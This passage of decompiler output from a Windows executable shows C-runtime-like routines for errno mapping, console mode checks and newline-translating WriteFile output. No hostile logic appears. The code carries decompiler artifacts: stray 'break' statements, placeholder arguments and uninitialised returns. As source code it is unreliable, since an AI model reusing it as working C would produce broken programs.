            if ((char)v6 == 0) {
                goto lab_0x40ac2d;
            }
        }
        // 0x40ac17
        int32_t v8; // bp-8, 0x40abe6
        *(int32_t *)((int32_t)&v8 - 4) = (int32_t)v7;
        v3 = v5 + 1 + (int32_t)(function_40d791((int32_t)&g266) != 0);
    }
    // 0x40ac34
    return result;
  lab_0x40ac2d:;
    int32_t v9 = v4 + 1; // 0x40ac2d
    char v10 = *(char *)v9; // 0x40ac2e
    v4 = v9;
    result = v9;
    if (v10 == 0 || v10 > 32) {
        return result;
    } else {
        goto lab_0x40ac2d;
    }
}

// Address range: 0x40ac39 - 0x40ac95
int32_t function_40ac39(int32_t * a1, int32_t * a2) {
    int32_t v1 = (int32_t)a1;
    uint32_t v2 = 3 - v1 + (int32_t)a2; // 0x40ac54
    int32_t v3 = v1; // 0x40ac66
    if (a2 < a1 || v2 < 4) {
        // 0x40ac84
        return function_406b2c();
    }
    int32_t v4 = 0; // 0x40ac66
    if (*(int32_t *)v3 != 0) {
        // 0x40ac71
        function_406b3d();
    }
    // 0x40ac7c
    v4++;
    v3 += 4;
    while (v4 != v2 / 4) {
        // 0x40ac68
        if (*(int32_t *)v3 != 0) {
            // 0x40ac71
            function_406b3d();
        }
        // 0x40ac7c
        v4++;
        v3 += 4;
    }
    // 0x40ac84
    return function_406b2c();
}

// Address range: 0x40ac95 - 0x40acda
int32_t function_40ac95(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40acca
        return function_406b2c();
    }
    int32_t v1 = (int32_t)a1; // 0x40acc0
    if (*(int32_t *)v1 != 0) {
        // 0x40acb2
        if (function_406b3d() != 0) {
            // break -> 0x40acca
            break;
        }
    }
    // 0x40acc0
    v1 += 4;
    while (v1 != (int32_t)a2) {
        // 0x40acac
        if (*(int32_t *)v1 != 0) {
            // 0x40acb2
            if (function_406b3d() != 0) {
                // break -> 0x40acca
                break;
            }
        }
        // 0x40acc0
        v1 += 4;
    }
    // 0x40acca
    return function_406b2c();
}

// Address range: 0x40acda - 0x40ad17
int32_t function_40acda(int32_t a1) {
    switch (a1) {
        case 0x10000: {
        }
        case 0x8000: {
        }
        case 0x4000: {
            // 0x40ad0c
            g232 = a1;
            return 0;
        }
    }
    // 0x40acf7
    *(int32_t *)function_40b091() = 22;
    return 22;
}

// Address range: 0x40ad17 - 0x40ad22
int32_t function_40ad17(void) {
    int32_t result = g199; // 0x40ad1f
    g199 = 1;
    return result;
}

// Address range: 0x40ad22 - 0x40ad6b
int32_t function_40ad22(void) {
    // 0x40ad22
    function_406cf0(&g91, 8, (int32_t)&g266);
    if (g206 != (int32_t)&g122) {
        // 0x40ad3b
        function_40c527(4);
        int32_t v1; // 0x40ad22
        int32_t * v2 = (int32_t *)(v1 - 4); // 0x40ad43
        *v2 = 0;
        g206 = function_40e6bb(&g206, (int32_t)&g122);
        *v2 = -2;
        function_40ad6b();
    }
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40ad65
    return result;
}

// Address range: 0x40ad6b - 0x40ad74
int32_t function_40ad6b(void) {
    // 0x40ad6b
    return function_40c56f(4);
}

// Address range: 0x40ad74 - 0x40add6
int32_t function_40ad74(int32_t a1) {
    int32_t * v1 = (int32_t *)(function_40bfb3() + 848); // 0x40ad87
    int32_t v2 = *v1; // 0x40ad87
    int32_t result = (v2 & 2) == 0 ? 2 : 1; // 0x40ad93
    int32_t v3; // 0x40ad74
    switch (a1) {
        case -1: {
            // 0x40adcc
            g139 = -1;
            // 0x40add3
            return result;
        }
        case 0: {
            // 0x40add3
            return result;
        }
        case 1: {
            // 0x40adc1
            v3 = v2 | 2;
            // break -> 0x40adc4
            break;
        }
        case 2: {
            // 0x40adbc
            v3 = v2 & -3;
            // break -> 0x40adc4
            break;
        }
        default: {
            // 0x40ada7
            *(int32_t *)function_40b091() = 22;
            // 0x40add3
            return -1;
        }
    }
    // 0x40adc4
    *v1 = v3;
    // 0x40add3
    return result;
}

// Address range: 0x40add6 - 0x40addc
int32_t function_40add6(void) {
    // 0x40add6
    return g200;
}

// Address range: 0x40addc - 0x40ae0b
int32_t function_40addc(uint32_t a1) {
    if (a1 >= 2) {
        // 0x40aded
        *(int32_t *)function_40b091() = 22;
        return -1;
    }
    int32_t result = g200; // 0x40ae07
    g200 = a1;
    return result;
}

// Address range: 0x40ae0b - 0x40ae11
int32_t function_40ae0b(void) {
    // 0x40ae0b
    return &g201;
}

// Address range: 0x40ae11 - 0x40ae16
int32_t function_40ae11(void) {
    // 0x40ae11
    return function_40c15c((int32_t)&g266);
}

// Address range: 0x40ae16 - 0x40ae51
int32_t function_40ae16(void) {
    // 0x40ae16
    function_411940(&g92, 12, (int32_t)&g266);
    if (*(int32_t *)(function_40bfb3() + 12) != 0) {
        // 0x40ae2e
        int32_t v1; // 0x40ae16
        int32_t * v2 = (int32_t *)(v1 - 4); // 0x40ae2e
        *v2 = 0;
        function_406b3d();
        *v2 = -2;
    }
    // 0x40ae4c
    function_40af0b();
    // UNREACHABLE
}

// Address range: 0x40ae54 - 0x40aeb1
int32_t function_40ae54(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40ae54
    int32_t v1; // 0x40ae54
    int32_t v2; // 0x40ae54
    if ((a2 & -0x30f0320 & a3) == 0) {
        int32_t v3 = function_40e7b6(a2, a3 & -0x80001, v1, v2);
        if (a1 != 0) {
            // 0x40ae9c
            *(int32_t *)a1 = v3;
        }
        // 0x40aeae
        return 0;
    }
    if (a1 != 0) {
        // 0x40ae74
        *(int32_t *)a1 = function_40e7b6(0, 0, v1, v2);
    }
    // 0x40ae81
    *(int32_t *)function_40b091() = 22;
    // 0x40aeae
    return 22;
}

// Address range: 0x40aeb1 - 0x40af0b
int32_t function_40aeb1(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1; // 0x40aeb1
    int32_t result; // 0x40aeb1
    if (a1 == 0 || a2 == 0) {
        goto lab_0x40aecf;
    } else {
        if (a3 != 0) {
            int32_t v2 = a2; // 0x40aee6
            int32_t v3 = a1; // 0x40aee6
            char v4 = *(char *)(a3 - a1 + v3); // 0x40aee8
            *(char *)v3 = v4;
            int32_t v5 = v2; // 0x40aef0
            while (v4 != 0) {
                // 0x40aef2
                v2--;
                v3++;
                v5 = v2;
                if (v2 == 0) {
                    // break -> 0x40aef7
                    break;
                }
                v4 = *(char *)(a3 - a1 + v3);
                *(char *)v3 = v4;
                v5 = v2;
            }
            // 0x40aef7
            if (v5 != 0) {
                // 0x40aede
                return 0;
            }
            // 0x40aefc
            *(char *)a1 = (char)v5;
            v1 = function_40b091();
            result = 34;
            goto lab_0x40aed6;
        } else {
            // 0x40aecc
            *(char *)a1 = 0;
            goto lab_0x40aecf;
        }
    }
  lab_0x40aecf:
    // 0x40aecf
    v1 = function_40b091();
    result = 22;
    goto lab_0x40aed6;
  lab_0x40aed6:
    // 0x40aed6
    *(int32_t *)v1 = result;
    // 0x40aede
    return result;
}

// Address range: 0x40af0b - 0x40af4d
int32_t function_40af0b(void) {
    // 0x40af0b
    int32_t v1; // 0x40af0b
    int32_t v2; // bp-4, 0x40af0b
    if (function_40dacb() != 0) {
        // 0x40af14
        v2 = 22;
        function_40db26(22);
        int32_t v3; // 0x40af0b
        v1 = &v3;
    }
    // 0x40af1c
    if ((g117 & 2) == 0) {
        // 0x40af46
        *(int32_t *)(v1 - 4) = 3;
        function_40a0e2((int32_t)&g266);
        // UNREACHABLE
    }
    // 0x40af25
    v2 = 23;
    if (IsProcessorFeaturePresent(23)) {
        // 0x40af30
        __asm_int(41);
    }
    // 0x40af35
    function_409a29(3, 0x40000015, 1, (int32_t)&g266);
    // 0x40af46
    *(int32_t *)((int32_t)&v2 - 4) = 3;
    function_40a0e2((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x40af50 - 0x40af59
int32_t function_40af50(void) {
    // 0x40af50
    return function_40ca21((int32_t)&g266, (int32_t)&g266);
}

// Address range: 0x40af59 - 0x40af93
int32_t function_40af59(int32_t a1, int32_t a2, int32_t result) {
    if (result == 0) {
        // 0x40af65
        return result;
    }
    int32_t v1 = result - 1; // 0x40af6e
    int32_t v2 = v1; // 0x40af71
    int32_t v3 = a1; // 0x40af71
    if (v1 == 0) {
        // 0x40af88
        return (int32_t)*(int16_t *)a1 - (int32_t)*(int16_t *)a2;
    }
    int32_t v4 = a2; // 0x40af71
    int16_t v5 = *(int16_t *)v3; // 0x40af73
    while (v5 != 0) {
        // 0x40af7b
        if (*(int16_t *)v4 != v5) {
            // break -> 0x40af88
            break;
        }
        // 0x40af80
        v3 += 2;
        v4 += 2;
        v2--;
        if (v2 == 0) {
            // break -> 0x40af88
            break;
        }
        v5 = *(int16_t *)v3;
    }
    // 0x40af88
    return (int32_t)*(int16_t *)v3 - (int32_t)*(int16_t *)v4;
}

// Address range: 0x40afa0 - 0x40b018
int32_t function_40afa0(int32_t a1, int32_t a2, int32_t a3) {
    if (a3 == 0) {
        // 0x40b006
        return 0;
    }
    int32_t v1 = a1 - a2; // 0x40afb6
    int32_t v2 = a2; // 0x40afbe
    int32_t v3 = a3; // 0x40afbe
    int32_t v4 = a2; // 0x40afbe
    int32_t v5 = a3; // 0x40afbe
    if ((a2 & 3) == 0) {
      lab_0x40afd7:;
        int32_t v6 = v5;
        int32_t v7 = v4;
        int32_t v8 = v7 + v1; // 0x40afd7
        v2 = v7;
        v3 = v6;
        while ((v8 & 4095) < 4093) {
            int32_t v9 = *(int32_t *)v8; // 0x40afe6
            v2 = v7;
            v3 = v6;
            if (v9 != *(int32_t *)v7) {
                // break -> 0x40afc0
                break;
            }
            int32_t v10 = v6 - 4; // 0x40afed
            if (v6 < 4 || v10 == 0) {
                // 0x40b006
                return 0;
            }
            // 0x40aff2
            if (((v9 & -0x7f7f7f80 ^ -0x7f7f7f80) & v9 - 0x1010101) != 0) {
                // 0x40b006
                return 0;
            }
            v6 = v10;
            v7 += 4;
            v8 = v7 + v1;
            v2 = v7;
            v3 = v6;
        }
    }
    int32_t v11 = v2; // 0x40afcc
    int32_t v12 = v3; // 0x40afcd
    unsigned char v13 = *(char *)(v11 + v1); // 0x40afc0
    unsigned char v14 = *(char *)v11; // 0x40afc4
    while (v13 == v14) {
        if (v13 == 0) {
            // 0x40b006
            return 0;
        }
        int32_t v15 = v12;
        v12 = v15 - 1;
        if (v15 == 0 || v12 == 0) {
            // 0x40b006
            return 0;
        }
        // 0x40afd2
        v11++;
        v4 = v11;
        v5 = v12;
        if ((v11 & 3) == 0) {
            goto lab_0x40afd7;
        }
        v13 = *(char *)(v11 + v1);
        v14 = *(char *)v11;
    }
    // 0x40b010
    return v13 < v14 ? -1 : 1;
}

// Address range: 0x40b018 - 0x40b05b
int32_t function_40b018(int32_t a1) {
    int32_t v1 = 0; // 0x40b020
    int32_t v2 = 8 * v1; // 0x40b022
    while (*(int32_t *)(v2 + (int32_t)&g33) != a1) {
        // 0x40b02b
        v1++;
        if (v1 >= 45) {
            if (a1 < 37) {
                // 0x40b039
                return 13;
            }
            // 0x40b03e
            return a1 > 202 ? 22 : 8;
        }
        v2 = 8 * v1;
    }
    // 0x40b052
    return *(int32_t *)(v2 + (int32_t)&g34);
}

// Address range: 0x40b05b - 0x40b05c
int32_t function_40b05b(void) {
    // 0x40b05b
    int32_t result; // 0x40b05b
    return result;
}

// Address range: 0x40b05d - 0x40b07e
int32_t function_40b05d(int32_t a1) {
    // 0x40b05d
    *(int32_t *)function_40b07e() = a1;
    int32_t v1 = function_40b018(a1); // 0x40b06c
    int32_t result = function_40b091(); // 0x40b074
    *(int32_t *)result = v1;
    return result;
}

// Address range: 0x40b07e - 0x40b091
int32_t function_40b07e(void) {
    int32_t v1 = function_40c037(); // 0x40b07e
    if (v1 != 0) {
        // 0x40b08d
        return v1 + 20;
    }
    // 0x40b087
    return &g119;
}

// Address range: 0x40b091 - 0x40b0a4
int32_t function_40b091(void) {
    int32_t v1 = function_40c037(); // 0x40b091
    if (v1 != 0) {
        // 0x40b0a0
        return v1 + 16;
    }
    // 0x40b09a
    return &g118;
}

// Address range: 0x40b0a4 - 0x40b0a5
int32_t function_40b0a4(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b0a4
    int32_t result; // 0x40b0a4
    return result;
}

// Address range: 0x40b0a6 - 0x40b257
int32_t function_40b0a6(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = 48 * (a2 & 63);
    int32_t * v2 = (int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40b0c6
    int32_t v3 = *(int32_t *)(v1 + 24 + *v2); // 0x40b0d7
    uint32_t v4 = a4 + a3; // 0x40b0e1
    int32_t v5 = GetConsoleCP(); // 0x40b0e6
    int32_t * v6 = (int32_t *)a1; // 0x40b0f7
    *v6 = 0;
    int32_t * v7 = (int32_t *)(a1 + 4); // 0x40b0f9
    *v7 = 0;
    int32_t * v8 = (int32_t *)(a1 + 8); // 0x40b0fc
    *v8 = 0;
    if (v4 <= a3) {
        // 0x40b244
        return function_406b2c();
    }
    int32_t v9 = v1 + 45;
    int32_t v10 = v1 + 46;
    char v11; // bp-16, 0x40b0a6
    int32_t v12 = &v11;
    int16_t v13; // bp-28, 0x40b0a6
    int32_t v14 = &v13;
    int32_t v15; // bp-24, 0x40b0a6
    int32_t v16 = &v15;
    int32_t v17; // bp-36, 0x40b0a6
    int32_t v18 = &v17;
    int32_t * hFile2; // bp-32, 0x40b0a6
    int32_t v19 = (int32_t)&hFile2;
    int32_t v20; // bp-72, 0x40b0a6
    int32_t v21 = &v20; // 0x40b0a6
    int32_t v22 = a3; // 0x40b19c
    int32_t * v23; // 0x40b0a6
    int32_t * v24; // 0x40b0a6
    int32_t * v25; // 0x40b0a6
    int32_t v26; // 0x40b0a6
    int32_t v27; // 0x40b0a6
    int32_t v28; // 0x40b0a6
    char v29; // 0x40b107
    unsigned char v30; // 0x40b143
    int32_t v31; // 0x40b177
    while (true) {
      lab_0x40b107:
        // 0x40b107
        v26 = v22;
        int32_t v32 = v21;
        char * v33 = (char *)v26; // 0x40b107
        v29 = *v33;
        v13 = 0;
        int32_t v34 = *v2; // 0x40b115
        char * v35 = (char *)(v34 + v9); // 0x40b11c
        char v36 = *v35; // 0x40b11c
        if ((v36 & 4) == 0) {
            int32_t v37 = function_40bc1b((int32_t)v29, 0); // 0x40b13e
            v30 = *v33;
            if (*(int16_t *)(2 * (int32_t)v30 + v37) > -1) {
                // 0x40b175
                *(int32_t *)(v32 - 4) = 1;
                v31 = v32 - 8;
                *(int32_t *)v31 = v26;
                goto lab_0x40b178;
            } else {
                if (v26 >= v4) {
                    // break -> 0x40b21b
                    break;
                }
                int32_t * v38 = (int32_t *)(v32 - 4);
                *v38 = 2;
                int32_t * v39 = (int32_t *)(v32 - 8);
                *v39 = v26;
                int32_t * v40 = (int32_t *)(v32 - 12);
                *v40 = v14;
                int32_t v41 = function_40c2de((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40b161
                if (v41 == -1) {
                    // 0x40b244
                    return function_406b2c();
                }
                // 0x40b172
                v23 = v40;
                v25 = v39;
                v24 = v38;
                v28 = v32;
                v27 = v26 + 1;
                goto lab_0x40b18d;
            }
        } else {
            // 0x40b125
            v11 = *(char *)(v34 + v10);
            *(int32_t *)(v32 - 4) = 2;
            *v35 = v36 & -5;
            int32_t v42 = v32 - 8; // 0x40b13b
            *(int32_t *)v42 = v12;
            v31 = v42;
            goto lab_0x40b178;
        }
    }
    // 0x40b21b
    *(char *)(*v2 + v10) = v30;
    char * v43 = (char *)(*v2 + v9); // 0x40b232
    *v43 = *v43 | 4;
    *v7 = *v7 + 1;
    // 0x40b244
    return function_406b2c();
  lab_0x40b178:;
    int32_t * v44 = (int32_t *)(v31 - 4); // 0x40b17b
    *v44 = v14;
    int32_t v45 = function_40c2de((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40b17c
    if (v45 == -1) {
        // 0x40b244
        return function_406b2c();
    }
    // 0x40b178
    v23 = v44;
    v25 = (int32_t *)v31;
    v24 = (int32_t *)(v31 + 4);
    v28 = v31 + 8;
    v27 = v26;
    goto lab_0x40b18d;
  lab_0x40b18d:;
    int32_t v46 = v28;
    *v24 = 0;
    *v25 = 0;
    *v23 = 5;
    *(int32_t *)(v46 - 16) = v16;
    *(int32_t *)(v46 - 20) = 1;
    *(int32_t *)(v46 - 24) = v14;
    *(int32_t *)(v46 - 28) = 0;
    *(int32_t *)(v46 - 32) = v5;
    uint32_t hFile = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266); // 0x40b1a2
    if (hFile == 0) {
        // 0x40b244
        return function_406b2c();
    }
    // 0x40b1b3
    *(int32_t *)(v46 - 36) = 0;
    *(int32_t *)(v46 - 40) = v18;
    *(int32_t *)(v46 - 44) = hFile;
    *(int32_t *)(v46 - 48) = v16;
    int32_t v47 = v46 - 52; // 0x40b1be
    *(int32_t *)v47 = v3;
    bool v48 = WriteFile((int32_t *)hFile, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266); // 0x40b1c1
    if (!v48) {
        // 0x40b23c
        *v6 = GetLastError();
        goto lab_0x40b244;
    }
    // 0x40b1cb
    v22 = v27 + 1;
    *v7 = v22 - a3 + *v8;
    if (v17 < hFile) {
        // 0x40b244
        return function_406b2c();
    }
    // 0x40b1de
    v21 = v47;
    if (v29 == 10) {
        // 0x40b1e4
        *(int32_t *)(v46 - 56) = 0;
        hFile2 = (int32_t *)13;
        *(int32_t *)(v46 - 60) = v18;
        *(int32_t *)(v46 - 64) = 1;
        *(int32_t *)(v46 - 68) = v19;
        int32_t v49 = v46 - 72; // 0x40b1f7
        *(int32_t *)v49 = v3;
        if (!WriteFile(hFile2, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40b23c
            *v6 = GetLastError();
            goto lab_0x40b244;
        }
        // 0x40b204
        if (v17 == 0) {
          lab_0x40b244:
            // 0x40b244
            return function_406b2c();
        }
        // 0x40b20a
        *v8 = *v8 + 1;
        *v7 = *v7 + 1;
        v21 = v49;
    }
    // 0x40b210
    if (v22 >= v4) {
        // 0x40b244
        return function_406b2c();
    }
    goto lab_0x40b107;
}

// Address range: 0x40b257 - 0x40b258
int32_t function_40b257(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x40b257
    int32_t result; // 0x40b257
    return result;
}

// Address range: 0x40b259 - 0x40b2c4
int32_t function_40b259(int32_t result, uint32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)result; // 0x40b268
    *v1 = 0;
    int32_t * v2 = (int32_t *)(result + 4); // 0x40b26a
    *v2 = 0;
    int32_t * v3 = (int32_t *)(result + 8); // 0x40b26d
    *v3 = 0;
    uint32_t v4 = a3 + a2; // 0x40b273
    if (v4 <= a2) {
        // 0x40b2bb
        return result;
    }
    // 0x40b27c
    int32_t v5; // bp-20, 0x40b259
    int32_t * v6 = (int32_t *)((int32_t)&v5 - 4); // 0x40b27f
    int32_t v7 = a2; // 0x40b2a9
    uint16_t v8 = *(int16_t *)v7; // 0x40b27c
    *v6 = (int32_t)v8;
    while (v8 == (int16_t)function_40ec40((int32_t)&g266)) {
        // 0x40b28b
        *v2 = *v2 + 2;
        if (v8 == 10) {
            // 0x40b294
            *v6 = 13;
            if ((int16_t)function_40ec40((int32_t)&g266) != 13) {
                // break -> 0x40b2b3
                break;
            }
            // 0x40b2a3
            *v2 = *v2 + 1;
            *v3 = *v3 + 1;
        }
        // 0x40b2a9
        v7 += 2;
        if (v7 >= v4) {
            // 0x40b2bb
            return result;
        }
        v8 = *(int16_t *)v7;
        *v6 = (int32_t)v8;
    }
    // 0x40b2b3
    *v1 = GetLastError();
    // 0x40b2bb
    return result;
}

// Address range: 0x40b2c4 - 0x40b2c5
int32_t function_40b2c4(int32_t a1) {
    // 0x40b2c4
    int32_t result; // 0x40b2c4
    return result;
}

// Address range: 0x40b2c6 - 0x40b33a
int32_t function_40b2c6(int32_t a1) {
    // 0x40b2c6
    int32_t v1; // 0x40b2c6
    int32_t v2; // 0x40b2c6
    int32_t v3; // 0x40b2c6
    int32_t v4 = function_40eb51(a1, v1, v3, v2); // 0x40b2cf
    if (v4 == 0) {
        // 0x40b335
        return v4 & -256;
    }
    int32_t v5 = 48 * (a1 & 63);
    int32_t * v6 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40b2e9
    int32_t v7 = *v6; // 0x40b2e9
    if (*(char *)(v5 + 40 + v7) > -1) {
        // 0x40b335
        return v7 & -256;
    }
    int32_t v8 = *(int32_t *)(function_40bfb3() + 76); // 0x40b2fc
    int32_t v9 = *v6;
    int32_t v10 = v9 + v5;
    if (*(int32_t *)(v8 + 168) == 0) {
        // 0x40b308
        if (*(char *)(v10 + 41) == 0) {
            // 0x40b335
            return v9 & -256;
        }
    }
    // 0x40b31a
    int32_t lpMode; // bp-8, 0x40b2c6
    bool v11 = GetConsoleMode((int32_t *)*(int32_t *)(v10 + 24), &lpMode); // 0x40b329
    // 0x40b335
    return (v11 ? -256 : 0) | (int32_t)v11;
}

// Address range: 0x40b33a - 0x40b33b
int32_t function_40b33a(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b33a
    int32_t result; // 0x40b33a
    return result;
}

// Address range: 0x40b33c - 0x40b419
int32_t function_40b33c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b33c
    int32_t v1; // 0x40b33c
    function_4119e0(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40b365
    int32_t * v3 = (int32_t *)a1; // 0x40b378
    *v3 = 0;
    uint32_t v4 = a4 + a3; // 0x40b37b
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40b37d
    *v5 = 0;
    int32_t * v6 = (int32_t *)(a1 + 8); // 0x40b381
    *v6 = 0;
    int32_t v7; // bp-5128, 0x40b33c
    int32_t v8 = &v7;
    int32_t v9 = a3; // 0x40b391
    int32_t v10; // bp-16, 0x40b33c
    int32_t v11 = &v10; // 0x40b391
    while (v9 < v4) {
        int32_t v12 = v8;
        int32_t v13 = v9;
        v9 = v13;
        int32_t v14 = v12; // 0x40b39b
        while (v13 < v4) {
            char v15 = *(char *)v13; // 0x40b39d
            int32_t v16 = v12; // 0x40b3a2
            if (v15 == 10) {
                // 0x40b3a4
                *v6 = *v6 + 1;
                *(char *)v12 = 13;
                v16 = v12 + 1;
            }
            int32_t v17 = v13 + 1; // 0x40b39f
            *(char *)v16 = v15;
            int32_t v18 = v16 + 1; // 0x40b3b0
            v9 = v17;
            v14 = v18;
            int32_t v19; // bp-9, 0x40b33c
            if (v18 >= (int32_t)&v19) {
                // break -> 0x40b3bb
                break;
            }
            v12 = v18;
            v13 = v17;
            v9 = v13;
            v14 = v12;
        }
        uint32_t v20 = v14 - v8; // 0x40b3c1
        *(int32_t *)(v11 - 4) = 0;
        int32_t v21; // bp-5136, 0x40b33c
        *(int32_t *)(v11 - 8) = (int32_t)&v21;
        *(int32_t *)(v11 - 12) = v20;
        *(int32_t *)(v11 - 16) = v8;
        v11 -= 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40b3fe
            *v3 = GetLastError();
            return function_406b2c();
        }
        // 0x40b3df
        *v5 = *v5 + v21;
        if (v21 < v20) {
            // break -> 0x40b406
            break;
        }
    }
  lab_0x40b406:
    // 0x40b406
    return function_406b2c();
}

// Address range: 0x40b419 - 0x40b41a
int32_t function_40b419(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b419
    int32_t result; // 0x40b419
    return result;
}

// Address range: 0x40b41b - 0x40b507
int32_t function_40b41b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b41b
    int32_t v1; // 0x40b41b
    function_4119e0(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40b444
    uint32_t v3 = a4 + a3; // 0x40b457
    int32_t * v4 = (int32_t *)a1; // 0x40b467
    *v4 = 0;
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40b469
    *v5 = 0;
    int32_t * v6 = (int32_t *)(a1 + 8); // 0x40b46c
    *v6 = 0;
    int32_t v7; // bp-5128, 0x40b41b
    int32_t v8 = &v7;
    int32_t v9 = a3; // 0x40b46f
    int32_t v10; // bp-16, 0x40b41b
    int32_t v11 = &v10; // 0x40b46f
    while (v9 < v3) {
        int32_t * v12 = (int32_t *)(v11 - 4);
        int32_t v13 = v8;
        int32_t v14 = v9;
        v9 = v14;
        int32_t v15 = v13; // 0x40b479
        while (v14 < v3) {
            int16_t v16 = *(int16_t *)v14; // 0x40b47b
            int32_t v17 = v13; // 0x40b484
            if (v16 == 10) {
                // 0x40b486
                *v6 = *v6 + 2;
                *v12 = 13;
                *(int16_t *)v13 = 13;
                v17 = v13 + 2;
            }
            int32_t v18 = v14 + 2; // 0x40b47e
            *(int16_t *)v17 = v16;
            int32_t v19 = v17 + 2; // 0x40b499
            v9 = v18;
            v15 = v19;
            int32_t v20; // bp-10, 0x40b41b
            if (v19 >= (int32_t)&v20) {
                // break -> 0x40b4a6
                break;
            }
            v13 = v19;
            v14 = v18;
            v9 = v14;
            v15 = v13;
        }
        // 0x40b4a6
        *v12 = 0;
        int32_t v21; // bp-5136, 0x40b41b
        *(int32_t *)(v11 - 8) = (int32_t)&v21;
        uint32_t v22 = v15 - v8 & -2; // 0x40b4b7
        *(int32_t *)(v11 - 12) = v22;
        *(int32_t *)(v11 - 16) = v8;
        v11 -= 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40b4ec
            *v4 = GetLastError();
            return function_406b2c();
        }
        // 0x40b4cd
        *v5 = *v5 + v21;
        if (v21 < v22) {
            // break -> 0x40b4f4
            break;
        }
    }
  lab_0x40b4f4:
    // 0x40b4f4
    return function_406b2c();
}

// Address range: 0x40b507 - 0x40b508
int32_t function_40b507(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40b507
    int32_t result; // 0x40b507
    return result;
}

// Address range: 0x40b509 - 0x40b634
int32_t function_40b509(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    // 0x40b509
    int32_t v1; // 0x40b509
    function_4119e0(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40b530
    uint32_t v3 = a4 + a3; // 0x40b54f
    int32_t * v4 = (int32_t *)a1; // 0x40b551
    *v4 = 0;
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40b553
    *v5 = 0;
    *(int32_t *)(a1 + 8) = 0;
    if (v3 <= a3) {
        // 0x40b621
        return function_406b2c();
    }
    // 0x40b567
    int32_t v6; // bp-1716, 0x40b509
    int32_t v7 = &v6; // 0x40b56d
    int32_t v8; // bp-5132, 0x40b509
    int32_t v9 = &v8; // 0x40b5a5
    int32_t v10; // bp-16, 0x40b509
    int32_t v11 = &v10; // 0x40b5e2
    int32_t * v12 = (int32_t *)(v11 - 4);
    int32_t v13 = a3;
    int32_t v14 = v7;
    int32_t v15 = v14; // 0x40b575
    int32_t v16 = v13; // 0x40b575
    int32_t v17; // 0x40b509
    int32_t v18; // bp-12, 0x40b509
    int16_t v19; // 0x40b577
    int32_t v20; // 0x40b57a
    int32_t v21; // 0x40b58e
    while (v13 < v3) {
        // 0x40b577
        v19 = *(int16_t *)v13;
        v17 = v14;
        if (v19 == 10) {
            // 0x40b582
            *v12 = 13;
            *(int16_t *)v14 = 13;
            v17 = v14 + 2;
        }
        // 0x40b58b
        v20 = v13 + 2;
        *(int16_t *)v17 = v19;
        v21 = v17 + 2;
        v15 = v21;
        v16 = v20;
        if (v21 >= (int32_t)&v18) {
            // break -> 0x40b598
            break;
        }
        v13 = v20;
        v14 = v21;
        v15 = v14;
        v16 = v13;
    }
    // 0x40b598
    *v12 = 0;
    *(int32_t *)(v11 - 8) = 0;
    *(int32_t *)(v11 - 12) = 3413;
    *(int32_t *)(v11 - 16) = v9;
    *(int32_t *)(v11 - 20) = (v15 - v7) / 2;
    *(int32_t *)(v11 - 24) = v7;
    *(int32_t *)(v11 - 28) = 0;
    int32_t v22 = v11 - 32; // 0x40b5b5
    *(int32_t *)v22 = 0xfde9;
    uint32_t v23 = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266); // 0x40b5ba
    int32_t v24 = 0; // 0x40b5cb
    while (v23 != 0) {
        // 0x40b567
        *(int32_t *)(v22 - 4) = 0;
        int32_t v25; // bp-5140, 0x40b509
        *(int32_t *)(v22 - 8) = (int32_t)&v25;
        *(int32_t *)(v22 - 12) = v23 - v24;
        *(int32_t *)(v22 - 16) = v24 + v9;
        v11 = v22 - 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // break (via goto) -> 0x40b619
            goto lab_0x40b619;
        }
        // 0x40b5f2
        v24 += v25;
        int32_t v26 = v11; // 0x40b600
        while (v24 < v23) {
            // 0x40b5cd
            *(int32_t *)(v26 - 4) = 0;
            *(int32_t *)(v26 - 8) = (int32_t)&v25;
